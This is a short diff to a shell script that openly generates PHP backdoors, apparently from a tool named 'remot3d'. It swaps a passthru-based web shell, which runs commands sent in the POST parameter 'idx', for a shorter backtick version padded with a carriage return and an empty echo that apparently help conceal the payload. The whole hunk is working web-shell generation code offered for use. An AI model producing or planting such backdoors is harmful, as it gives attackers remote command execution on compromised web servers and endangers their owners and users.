@@ -57,7 +57,7 @@ main_remot3d_1 () {
     echo "";
     printf "      ${white}[${green}+${white}] Set Your Backdoor Name : "
     read out_name
-    generate_file=$(echo "<?php echo passthru($_POST['idx'].' 2>&1'); ?>" > $out_name)
+    generate_file=$(echo -e "<?=\`\$_POST[idx]\`?>\r<?='';?>" > $out_name)
     printf "      ${white}[${green}+${white}] Success Generating Backdoor on ${green}$pwd/$out_name\n"
     echo "";
 
